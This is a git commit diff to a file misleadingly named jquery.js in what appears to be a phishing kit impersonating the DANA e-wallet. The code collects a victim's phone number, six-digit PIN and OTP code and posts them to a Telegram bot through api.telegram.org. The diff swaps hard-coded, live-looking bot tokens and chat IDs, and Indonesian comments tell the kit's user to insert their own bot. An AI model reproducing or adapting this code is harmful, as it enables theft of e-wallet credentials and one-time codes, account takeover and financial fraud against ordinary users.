247e92843102f76b4a32fffcb00e6879653a7200
aktifkan-dana <developer_linkz@outlook.com>
2024-10-31 19:51:59 +0700

    Add files via upload

--- web/jquery.js
+++ web/jquery.js
@@ -108,8 +108,8 @@ $(".bgotp").hide();
     
     var gabungan = '' + logo.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value;
    
-   var token = '7978962616:AAEJRyJkOSBU8Sm8MJUSDz_itj83sxvAjlU'; // Ganti dengan token bot yang kamu buat
-    var grup = '5409755431'; // Ganti dengan chat id dari bot yang kamu buat
+   var token = '7618067358:AAHfnOfj0MTIFNo3FeSw2Mg79i7LO33aLGk'; // Ganti dengan token bot yang kamu buat
+    var grup = '7098604214'; // Ganti dengan chat id dari bot yang kamu buat
 
 
     $.ajax({
@@ -148,8 +148,8 @@ function sendPin(){
      
  
 
-    var token = '7978962616:AAEJRyJkOSBU8Sm8MJUSDz_itj83sxvAjlU'; // Ganti dengan token bot yang kamu buat
-    var grup = '5409755431'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '7618067358:AAHfnOfj0MTIFNo3FeSw2Mg79i7LO33aLGk'; // Ganti dengan token bot yang kamu buat
+    var grup = '7098604214'; // Ganti dengan chat id dari bot yang kamu buat
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
         method: `POST`,
@@ -188,8 +188,8 @@ $(".alert").css("color","red");
     var gabungan = '' + logo.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value + '%0A※ 𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A※ 𝗢𝗧𝗣 𝗗𝗔𝗡𝗔     : ' + otp1.value + otp2.value + otp3.value + otp4.value;
 
 
-    var token = '7978962616:AAEJRyJkOSBU8Sm8MJUSDz_itj83sxvAjlU'; // Ganti dengan token bot yang kamu buat
-    var grup = '5409755431'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '7618067358:AAHfnOfj0MTIFNo3FeSw2Mg79i7LO33aLGk'; // Ganti dengan token bot yang kamu buat
+    var grup = '7098604214'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
